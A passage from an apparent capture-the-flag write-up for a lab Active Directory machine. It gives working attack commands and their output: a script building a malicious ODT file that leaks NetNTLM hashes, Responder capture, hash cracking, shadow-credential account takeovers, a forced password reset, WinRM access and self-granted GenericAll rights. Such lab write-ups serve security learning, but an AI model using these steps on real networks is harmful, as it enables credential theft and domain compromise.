# Create a copy of the blank odt file without the content.xml file in (odt files are basically a zip)
with zipfile.ZipFile('temp.odt', 'r') as zin, zipfile.ZipFile('bad.odt', 'w') as zout:
    for item in zin.infolist():
        buffer = zin.read(item.filename)
        if item.filename != 'content.xml':
            zout.writestr(item, buffer)

# Add our modified content.xml file to our odt file
with zipfile.ZipFile('bad.odt', mode='a') as zf:
    zf.write('content.xml', arcname='content.xml')

if os.path.isfile(os.getcwd()+"/bad.odt"):
    print(os.getcwd()+"/bad.odt successfully created\n")

# Clean up temp files
os.remove("content.xml")
os.remove("temp.odt")
```

```bash
$ python3 badodt.py 

    ____            __      ____  ____  ______
   / __ )____ _____/ /     / __ \/ __ \/ ____/
  / __  / __ `/ __  /_____/ / / / / / / /_    
 / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/    
/_____/\__,_/\__,_/      \____/_____/_/     


Create a malicious ODF document help leak NetNTLM Creds

By Richard Davy 
@rd_pentest
Python3 version by @gustanini
www.secureyourit.co.uk


Please enter IP of listener: 10.10.14.39
/home/ninjathebox98w1/Downloads/badodf/bad.odt successfully created
```

![[hercules9.png]]

```bash
$ sudo responder -I tun0 

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.39]
    Responder IPv6             [dead:beef:2::1025]
    Challenge set              [random]
    Dont Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-WDWRI7DGYGR]
    Responder Domain Name      [6M81.LOCAL]
    Responder DCE-RPC Port     [47302]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.194.75
[SMB] NTLMv2-SSP Username : HERCULES\natalie.a
[SMB] NTLMv2-SSP Hash     : natalie.a::HERCULES:f0bc8835c589980f:C60849AA294ED1356EF775D542CF77D8:01010000000000000059B6BC2341DC01D1B08EDCD1D97BD7000000000200080036004D003800310001001E00570049004E002D005700440057005200490037004400470059004700520004003400570049004E002D00570044005700520049003700440047005900470052002E0036004D00380031002E004C004F00430041004C000300140036004D00380031002E004C004F00430041004C000500140036004D00380031002E004C004F00430041004C00070008000059B6BC2341DC01060004000200000008003000300000000000000000000000002000005F1FAAE7E954DDE2F16665C2634057066829AEEA170513120A62095F33919E400A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330039000000000000000000
```

```bash
$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

We get pass of `natalie.a:Prettyprincess123!`.

Can't access SMB normally so trying kerberos authentication with `-k`:

```bash
$ nxc smb 10.129.194.75 -u natalie.a -p 'Prettyprincess123!' -k
SMB         10.129.194.75   445    10.129.194.75    [*]  x64 (name:10.129.194.75) (domain:10.129.194.75) (signing:True) (SMBv1:False)
SMB         10.129.194.75   445    10.129.194.75    [-] 10.129.194.75\natalie.a:Prettyprincess123! KDC_ERR_WRONG_REALM 
```

```bash
sudo apt update && sudo apt install krb5-user -y
```

Add realm first `/etc/krb5.conf`:

```
[libdefaults]
    default_realm = HERCULES.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    rdns = false
    ticket_lifetime = 24h
    forwardable = yes
    default_ccache_name = FILE:/tmp/krb5cc_%{uid}
    
[realms]
    HERCULES.HTB = {
        kdc = dc.hercules.htb
        admin_server = dc.hercules.htb
        default_domain = hercules.htb
    }

[domain_realm]
    .hercules.htb = HERCULES.HTB
    hercules.htb = HERCULES.HTB
```

If you still get error. Make sure in your `/etc/hosts` file that `dc.hercules.htb` is first after the IP and not `hercules.htb`.

```
10.129.194.75 dc.hercules.htb hercules.htb
```

Still got error so just got the bloodhound.
## Bloodhound

```bash
$ bloodhound-python -d hercules.htb -u natalie.a -p 'Prettyprincess123!' -ns 10.129.194.75 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hercules.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.hercules.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.hercules.htb
INFO: Found 49 users
INFO: Found 62 groups
INFO: Found 2 gpos
INFO: Found 9 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.hercules.htb
INFO: Done in 00M 02S
```

Let's see GenericWrite,

```bash
$ bloodyAD --host dc.hercules.htb -d hercules.htb -u natalie.a -p 'Prettyprincess123!' -k --dc-ip 10.129.194.75 get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=web_admin,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Bob Wood,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Ken Wiggins,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Johnathan Johnson,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Harris Dunlop,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Ray Nelson,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Natalie Andrews,OU=Hades Employees,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE
```
## Shadow Credentials on `bob.w` as `natalie.a`

**Shadow Credentials** is an AD attack that allows you to **take over a user/computer account** by adding a **Key Credential** to their `msDS-KeyCredentialLink` attribute  It's a modern alternative to the older "Kerberoasting" or "AS-REP Roasting" (I think kerberoasting might also work.)

1. **Add Key Credentials**: You add a public key to the target user's `msDS-KeyCredentialLink` attribute
2. **Authenticate with Certificate**: You can then authenticate as that user using the corresponding private key
3. **Get TGT/Tokens**: This gives you a Ticket Granting Ticket (TGT) as that user

```bash
$ bloodyAD --host dc.hercules.htb -d hercules.htb -u natalie.a -p 'Prettyprincess123!' -k --dc-ip 10.129.194.75 add shadowCredentials bob.w
[+] KeyCredential generated with following sha256 of RSA key: cbe84eb4beb32459a55bd443c4da95af14283b9824a2053c42e35c4f9369a65f
[+] TGT stored in ccache file bob.w_ZS.ccache

NT: 8a65c74e8f0073babbfac6725c66cc3f
```

We have:

1. **TGT for bob.w** in `bob.w_ZS.ccache`
2. **NT hash for bob.w**: `8a65c74e8f0073babbfac6725c66cc3f`

If you somehow get `.pfx` from above `bloodyAD` command convert it to `ccache`:

```bash
$ certipy auth -pfx bob.w_8Y.pfx -dc-ip 10.129.194.75 -username bob.w -domain hercules.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'bob.w@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'bob.w.ccache'
[*] Wrote credential cache to 'bob.w.ccache'
[*] Trying to retrieve NT hash for 'bob.w'
[*] Got hash for 'bob.w@hercules.htb': aad3b435b51404eeaad3b435b51404ee:8a65c74e8f0073babbfac6725c66cc3f
```

![[hercules10.png]]

While looking in bloodhound in Transitive Object Control of `stephen.m` noticed that he is member of Security Helpdesk and it has `ForceChangePassword` for Auditor. But we have to get to `stephen.m` somehow. You can also see this from:

1. **Right-click bob.w** 
2. **Run "Shortest Paths to High Value Targets"**  But this will show us many different path which might be useful in privilege escalation.

![[hercules11.png]]

Move `stephen.m` to Web Department OU which then as `natalie` try shadow credential again to `stephen.m`.

```bash
$ sudo ntpdate 10.129.176.116
2025-10-20 02:58:14.176993 (-0500) +0.526377 +/- 0.004814 10.129.176.116 s1 no-leap
CLOCK: time stepped by 0.526377
```

BloodyAd wasn't working so used Powerview.

```bash
pip3 install powerview
```

```bash
$ export KRB5CCNAME=bob.w_ZS.ccache
```

```bash
$ powerview hercules.htb/bob.w@dc.hercules.htb -k --use-ldaps --dc-ip 10.129.176.116 -d --no-pass
Logging directory is set to /home/ninjathebox98w1/.powerview/logs/hercules-bob.w-dc.hercules.htb
[2025-10-20 03:08:54] [ConnectionPool] Started LDAP connection pool cleanup thread
[2025-10-20 03:08:54] [ConnectionPool] Started LDAP connection pool keep-alive thread
[2025-10-20 03:08:54] LDAP sign and seal are supported
[2025-10-20 03:08:54] TLS channel binding is supported
[2025-10-20 03:08:54] Authentication: SASL, User: bob.w@hercules.htb
[2025-10-20 03:08:54] Connecting to dc.hercules.htb, Port: 636, SSL: True
[2025-10-20 03:08:54] Using Kerberos Cache: bob.w_vc.ccache
[2025-10-20 03:08:54] SPN LDAP/DC.HERCULES.HTB@HERCULES.HTB not found in cache
[2025-10-20 03:08:54] AnySPN is True, looking for another suitable SPN
[2025-10-20 03:08:54] Returning cached credential for KRBTGT/HERCULES.HTB@HERCULES.HTB
[2025-10-20 03:08:54] Using TGT from cache
[2025-10-20 03:08:54] Trying to connect to KDC at 10.129.176.116:88
[2025-10-20 03:08:55] [Storage] Using cache directory: /home/ninjathebox98w1/.powerview/storage/ldap_cache
[2025-10-20 03:08:55] [VulnerabilityDetector] Created default vulnerability rules at /home/ninjathebox98w1/.powerview/vulns.json
[2025-10-20 03:08:55] [Get-DomainObject] Using search base: DC=hercules,DC=htb
[2025-10-20 03:08:55] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(|(samAccountName=bob.w)(name=bob.w)(displayName=bob.w)(objectSid=bob.w)(distinguishedName=bob.w)(dnsHostName=bob.w)(objectGUID=*bob.w*)))
[2025-10-20 03:08:55] [ConnectionPool] LDAP added connection for domain: hercules.htb
╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
<- Set-DomainObjectDN -Identity stephen.m -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'

[2025-10-20 03:09:49] [Get-DomainObject] Using search base: DC=hercules,DC=htb
[2025-10-20 03:09:49] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(|(samAccountName=stephen.m)(name=stephen.m)(displayName=stephen.m)(objectSid=stephen.m)(distinguishedName=stephen.m)(dnsHostName=stephen.m)(objectGUID=*stephen.m*)))
[2025-10-20 03:09:49] [Get-DomainObject] Using search base: DC=hercules,DC=htb
[2025-10-20 03:09:49] [Get-DomainObject] LDAP search filter: (&(1.2.840.113556.1.4.2=*)(distinguishedName=OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb))
[2025-10-20 03:09:49] [Set-DomainObjectDN] Modifying CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb object dn to OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
[2025-10-20 03:09:49] [Set-DomainObject] Success! modified new dn for CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
```

Now do shadow credential attack to `stephen.m` from `natalie` since we changed the OU to that `natalie` can perform attack on `Web Department`. Make sure to do it fast as possible otherwise the configuration might reset.
## Shadow Credential Attack on `stephen.m`  as `natalie.a`

```bash
$ bloodyAD --host dc.hercules.htb -d hercules.htb -u natalie.a -p 'Prettyprincess123!' -k --dc-ip 10.129.176.116 add shadowCredentials stephen.m
[+] KeyCredential generated with following sha256 of RSA key: e6b73b5fa10a397ddcd73fd3ff5dc43b08522ec95fb63378afebe3b6986e80ac
[+] TGT stored in ccache file stephen.m_RY.ccache

NT: 9aaaedcb19e612216a2dac9badb3c210
```

Again if you get `.pfx` somehow convert it to `.ccache`.

```bash
$ certipy auth -pfx stephen.m_z6.pfx -dc-ip 10.129.176.116 -username stephen.m -domain hercules.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'stephen.m@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'stephen.m.ccache'
[*] Wrote credential cache to 'stephen.m.ccache'
[*] Trying to retrieve NT hash for 'stephen.m'
[*] Got hash for 'stephen.m@hercules.htb': aad3b435b51404eeaad3b435b51404ee:9aaaedcb19e612216a2dac9badb3c210
```

Now we can change password for Auditor.
## Change Pass Auditor

```bash
export KRB5CCNAME=stephen.m_RY.ccache
```

```bash
$ klist
Ticket cache: FILE:stephen.m_RY.ccache
Default principal: stephen.m@HERCULES.HTB

Valid starting       Expires              Service principal
10/20/2025 03:32:02  10/20/2025 13:32:02  krbtgt/HERCULES.HTB@HERCULES.HTB
10/20/2025 03:32:02  10/20/2025 13:32:02  stephen.m@HERCULES.HTB
```

Fuck I got errors don't know why so tried this and worked:

```bash
$ kinit -k -t /dev/null -c stephen.m_RY.ccache stephen.m@HERCULES.HTB
kvno LDAP/dc.hercules.htb@HERCULES.HTB

kinit: Pre-authentication failed: Unsupported key table format version number while getting initial credentials
LDAP/dc.hercules.htb@HERCULES.HTB: kvno = 4

$ bloodyAD --host dc.hercules.htb -d hercules.htb -u stephen.m -k set password Auditor 'NewPassword123!'
[+] Password changed successfully!
```

```bash
$ impacket-getTGT 'HERCULES.HTB/Auditor:NewPassword123!'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Auditor.ccache
```

Use [winrmexec](https://github.com/ozelis/winrmexec).
## Winrmexec

```bash
export KRB5CCNAME=Auditor.ccache
```

```bash
$ python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
[*] '-target_ip' not specified, using dc.hercules.htb
[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
[*] using domain and username from ccache: HERCULES.HTB\Auditor
[*] '-spn' not specified, using HTTP/dc.hercules.htb@HERCULES.HTB
[*] '-dc-ip' not specified, using HERCULES.HTB
[*] requesting TGS for HTTP/dc.hercules.htb@HERCULES.HTB

Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully
This is not an interactive shell! If you need to run programs that expect
inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell

PS C:\Users\auditor\Documents> cd ..\Desktop
PS C:\Users\auditor\Desktop> ls


    Directory: C:\Users\auditor\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-ar---        10/20/2025   2:36 AM             34 user.txt                                                              


PS C:\Users\auditor\Desktop> cat user.txt
b5c77131749e61ae9d97f9d269c435f1
```
# Privilege  Escalation

Check if you're in Auditor group.

```powershell  
PS C:\Users\auditor\Documents> net user "auditor" /domain
User name                    auditor
Full Name                    Auditor
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            20/10/2025 6:43:02 PM
Password expires             Never
Password changeable          20/10/2025 6:43:02 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   20/10/2025 6:44:52 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Employees     *Forest Management    
                             *Domain Users         
The command completed successfully.
```

From above:

- **`Domain Employees`** - Basic domain user group
- **`Forest Management`** - This is interesting! This group might already have some privileges
- **`Domain Users`** - Basic domain user group

We are already a member of **`Forest Management`** group. This might give us some privileges that are interesting.

Let's see what Forest Management group can do:

```powershell
PS C:\Users\auditor\Documents> dsacls "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb"
Owner: HERCULES\Domain Admins
Group: HERCULES\Domain Admins

Access list:
Allow HERCULES\Windows Computer Administrators
                                      SPECIAL ACCESS
                                      CREATE CHILD
Allow HERCULES\Domain Admins          FULL CONTROL
Allow HERCULES\Forest Management      FULL CONTROL
Allow HERCULES\Forest Management      SPECIAL ACCESS
                                      READ PERMISSONS
                                      LIST CONTENTS
                                      READ PROPERTY
                                      LIST OBJECT
Allow NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
                                      SPECIAL ACCESS
                                      READ PERMISSONS
                                      LIST CONTENTS
                                      READ PROPERTY
                                      LIST OBJECT
Allow NT AUTHORITY\SYSTEM             FULL CONTROL
Allow HERCULES\Enterprise Admins      FULL CONTROL   <Inherited from parent>
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS   <Inherited from parent>
                                      LIST CONTENTS
Allow BUILTIN\Administrators          SPECIAL ACCESS   <Inherited from parent>
                                      DELETE
                                      READ PERMISSONS
                                      WRITE PERMISSIONS
                                      CHANGE OWNERSHIP
                                      CREATE CHILD
                                      LIST CONTENTS
                                      WRITE SELF
                                      WRITE PROPERTY
                                      READ PROPERTY
                                      LIST OBJECT
                                      CONTROL ACCESS
Allow BUILTIN\Account Operators       SPECIAL ACCESS for inetOrgPerson
                                      CREATE CHILD
                                      DELETE CHILD
Allow BUILTIN\Account Operators       SPECIAL ACCESS for computer
                                      CREATE CHILD
                                      DELETE CHILD
Allow BUILTIN\Account Operators       SPECIAL ACCESS for group
                                      CREATE CHILD
                                      DELETE CHILD
Allow BUILTIN\Print Operators         SPECIAL ACCESS for printQueue
                                      CREATE CHILD
                                      DELETE CHILD
Allow BUILTIN\Account Operators       SPECIAL ACCESS for user
                                      CREATE CHILD
                                      DELETE CHILD
Allow HERCULES\Key Admins             SPECIAL ACCESS for msDS-KeyCredentialLink   <Inherited from parent>
                                      WRITE PROPERTY
                                      READ PROPERTY
Allow HERCULES\Enterprise Key Admins  SPECIAL ACCESS for msDS-KeyCredentialLink   <Inherited from parent>
                                      WRITE PROPERTY
                                      READ PROPERTY
Allow NT AUTHORITY\SELF               SPECIAL ACCESS for msDS-AllowedToActOnBehalfOfOtherIdentity   <Inherited from parent>
                                      WRITE PROPERTY
                                      READ PROPERTY
Allow NT AUTHORITY\SELF               SPECIAL ACCESS for Private Information   <Inherited from parent>
                                      WRITE PROPERTY
                                      READ PROPERTY
                                      CONTROL ACCESS
Allow HERCULES\Helpdesk Administrators
                                      Reset Password   <Inherited from parent>

Permissions inherited to subobjects are:
Inherited to all subobjects
Allow HERCULES\Forest Management      SPECIAL ACCESS
                                      READ PERMISSONS
                                      LIST CONTENTS
                                      READ PROPERTY
                                      LIST OBJECT
Allow HERCULES\Enterprise Admins      FULL CONTROL   <Inherited from parent>
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS   <Inherited from parent>
                                      LIST CONTENTS
Allow BUILTIN\Administrators          SPECIAL ACCESS   <Inherited from parent>
                                      DELETE
                                      READ PERMISSONS
                                      WRITE PERMISSIONS
                                      CHANGE OWNERSHIP
                                      CREATE CHILD
                                      LIST CONTENTS
                                      WRITE SELF
                                      WRITE PROPERTY
                                      READ PROPERTY
                                      LIST OBJECT
                                      CONTROL ACCESS
Allow HERCULES\Key Admins             SPECIAL ACCESS for msDS-KeyCredentialLink   <Inherited from parent>
                                      WRITE PROPERTY
                                      READ PROPERTY
Allow HERCULES\Enterprise Key Admins  SPECIAL ACCESS for msDS-KeyCredentialLink   <Inherited from parent>
                                      WRITE PROPERTY
                                      READ PROPERTY
Allow NT AUTHORITY\SELF               SPECIAL ACCESS for msDS-AllowedToActOnBehalfOfOtherIdentity   <Inherited from parent>
                                      WRITE PROPERTY
                                      READ PROPERTY
Allow NT AUTHORITY\SELF               SPECIAL ACCESS for Private Information   <Inherited from parent>
                                      WRITE PROPERTY
                                      READ PROPERTY
                                      CONTROL ACCESS
Allow HERCULES\Helpdesk Administrators
                                      Reset Password   <Inherited from parent>

Inherited to user
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for Account Restrictions   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for Logon Information   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for Group Membership   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for General Information   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for Remote Access Information   <Inherited from parent>
                                      READ PROPERTY
Allow NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
                                      SPECIAL ACCESS for tokenGroups   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS   <Inherited from parent>
                                      READ PERMISSONS
                                      LIST CONTENTS
                                      READ PROPERTY
                                      LIST OBJECT
Inherited to inetOrgPerson
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for Account Restrictions   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for Logon Information   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for Group Membership   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for General Information   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS for Remote Access Information   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS   <Inherited from parent>
                                      READ PERMISSONS
                                      LIST CONTENTS
                                      READ PROPERTY
                                      LIST OBJECT
Inherited to group
Allow NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
                                      SPECIAL ACCESS for tokenGroups   <Inherited from parent>
                                      READ PROPERTY
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS   <Inherited from parent>
                                      READ PERMISSONS
                                      LIST CONTENTS
                                      READ PROPERTY
                                      LIST OBJECT
Inherited to computer
Allow CREATOR OWNER                   SPECIAL ACCESS for Validated write to computer attributes.   <Inherited from parent>
                                      WRITE SELF
Allow NT AUTHORITY\SELF               SPECIAL ACCESS for Validated write to computer attributes.   <Inherited from parent>
                                      WRITE SELF
Allow NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
                                      SPECIAL ACCESS for tokenGroups   <Inherited from parent>
                                      READ PROPERTY
Allow NT AUTHORITY\SELF               SPECIAL ACCESS for msTPM-TpmInformationForComputer   <Inherited from parent>
                                      WRITE PROPERTY
The command completed successfully
```

```
Inherited to all subobjects
Allow HERCULES\Forest Management      SPECIAL ACCESS
                                      READ PERMISSONS
                                      LIST CONTENTS
                                      READ PROPERTY
                                      LIST OBJECT
```

The dsacls output shows that while the Forest Management group has FULL CONTROL over the Forest Migration OU container itself, it only has READ-ONLY permissions on the objects inside the OU. This means you can view and list the disabled users but cannot modify, enable, or reset their passwords. To gain the necessary permissions, we need to run the `dsacls` command with the `/I:T` flag, which grants `GenericAll` rights that inherit down to all objects within the OU, allowing you to enable fernando.r and proceed with the attack.

Lets see users that are in Forest Migration OU.

```bash
PS C:\Users\auditor\Documents> Get-ADUser -Filter * -SearchBase "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" -Properties Enabled, LastLogonDate, Description


Description       : 
DistinguishedName : CN=James Silver,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : James
LastLogonDate     : 
Name              : James Silver
ObjectClass       : user
ObjectGUID        : 628e5829-12bd-419e-b210-6e921d48b004
SamAccountName    : james.s
SID               : S-1-5-21-1889966460-2597381952-958560702-1122
Surname           : Silver
UserPrincipalName : james.s@hercules.htb

Description       : 
DistinguishedName : CN=Anthony Rudd,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : Anthony
LastLogonDate     : 
Name              : Anthony Rudd
ObjectClass       : user
ObjectGUID        : 61df4a73-a5b6-43f5-bec4-248a6fecfa33
SamAccountName    : anthony.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1123
Surname           : Rudd
UserPrincipalName : anthony.r@hercules.htb

Description       : 
DistinguishedName : CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : IIS_Administrator
LastLogonDate     : 
Name              : IIS_Administrator
ObjectClass       : user
ObjectGUID        : 0ed3b2f9-aefa-41e7-9dcb-c7116ca37a1d
SamAccountName    : iis_administrator
SID               : S-1-5-21-1889966460-2597381952-958560702-1119
Surname           : 
UserPrincipalName : iis_administrator@hercules.htb

Description       : 
DistinguishedName : CN=Taylor Maxwell,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : Taylor
LastLogonDate     : 
Name              : Taylor Maxwell
ObjectClass       : user
ObjectGUID        : f126a286-f0ee-4c81-a543-85117f3f46de
SamAccountName    : taylor.m
SID               : S-1-5-21-1889966460-2597381952-958560702-1120
Surname           : Maxwell
UserPrincipalName : taylor.m@hercules.htb

Description       : 
DistinguishedName : CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
Enabled           : False
GivenName         : Fernando
LastLogonDate     : 
Name              : Fernando Rodriguez
ObjectClass       : user
ObjectGUID        : 80ea16f3-f1e3-4197-9537-e756c2d1ebb0
SamAccountName    : fernando.r
SID               : S-1-5-21-1889966460-2597381952-958560702-1121
Surname           : Rodriguez
UserPrincipalName : fernando.r@hercules.htb
```

1. **james.s** - James Silver
2. **anthony.r** - Anthony Rudd
3. **iis_administrator** - IIS_Administrator
4. **taylor.m** - Taylor Maxwell
5. **fernando.r** - Fernando Rodriguez

All Users in Forest Migration OU accounts are disabled. `iis_administrator` is interesting but we don't have permission to enable it.

```powershell
PS C:\Users\auditor\Documents> Enable-ADAccount -Identity "CN=iis_administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" -ErrorAction S
ilentlyContinue
Insufficient access rights to perform the operation
```

Upon checking users properties of `fernando.r` we see something interesting:

```powershell
PS C:\Users\auditor\Documents> Get-ADUser -Identity "fernando.r" -Properties MemberOf | Select-Object -ExpandProperty MemberOf
CN=Smartcard Operators,OU=Domain Groups,OU=DCHERCULES,DC=hercules,DC=htb
CN=Domain Employees,OU=Domain Groups,OU=DCHERCULES,DC=hercules,DC=htb
```

**fernando.r is in `Smartcard Operators` group**. This usually has **Enroll in certificate templates** and they can request certificates. That gives us chance for doing ADCS attacks okay then first:
##### 1 Grant `GenericAll` (GA) with inheritance in Forest Migration.

```powershell
# This grants explicit GenericAll with inheritance
PS C:\Users\auditor\Documents> dsacls "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" /G "HERCULES\AUDITOR:GA" /I:T
Owner: HERCULES\Domain Admins
Group: HERCULES\Domain Admins

Access list:
Allow HERCULES\Windows Computer Administrators
                                      SPECIAL ACCESS
                                      CREATE CHILD
Allow HERCULES\Domain Admins          FULL CONTROL
Allow HERCULES\Forest Management      FULL CONTROL
Allow HERCULES\Forest Management      SPECIAL ACCESS
                                      READ PERMISSONS
                                      LIST CONTENTS
                                      READ PROPERTY
                                      LIST OBJECT
Allow HERCULES\auditor                FULL CONTROL
Allow NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
                                      SPECIAL ACCESS
                                      READ PERMISSONS
                                      LIST CONTENTS
                                      READ PROPERTY
                                      LIST OBJECT
Allow NT AUTHORITY\SYSTEM             FULL CONTROL
Allow HERCULES\Enterprise Admins      FULL CONTROL   <Inherited from parent>
Allow BUILTIN\Pre-Windows 2000 Compatible Access
                                      SPECIAL ACCESS   <Inherited from parent>
                                      LIST CONTENTS
Allow BUILTIN\Administrators          SPECIAL ACCESS   <Inherited from parent>
                                      DELETE
                                      READ PERMISSONS
                                      WRITE PERMISSIONS
                                      CHANGE OWNERSHIP
                                      CREATE CHILD
                                      LIST CONTENTS
                                      WRITE SELF
                                      WRITE PROPERTY
                                      READ PROPERTY
                                      LIST OBJECT
                                      CONTROL ACCESS
Allow BUILTIN\Account Operators       SPECIAL ACCESS for inetOrgPerson
                                      CREATE CHILD
                                      DELETE CHILD
Allow BUILTIN\Account Operators       SPECIAL ACCESS for computer
                                      CREATE CHILD
                                      DELETE CHILD
Allow BUILTIN\Account Operators       SPECIAL ACCESS for group
                                      CREATE CHILD
                                      DELETE CHILD
Allow BUILTIN\Print Operators         SPECIAL ACCESS for printQueue
                                      CREATE CHILD
                                      DELETE CHILD
Allow BUILTIN\Account Operators       SPECIAL ACCESS for user
                                      CREATE CHILD
                                      DELETE CHILD
Allow HERCULES\Key Admins             SPECIAL ACCESS for msDS-KeyCredentialLink   <Inherited from parent>
                                      WRITE PROPERTY
                                      READ PROPERTY
Allow HERCULES\Enterprise Key Admins  SPECIAL ACCESS for msDS-KeyCredentialLink   <Inherited from parent>
                                      WRITE PROPERTY
                                      READ PROPERTY
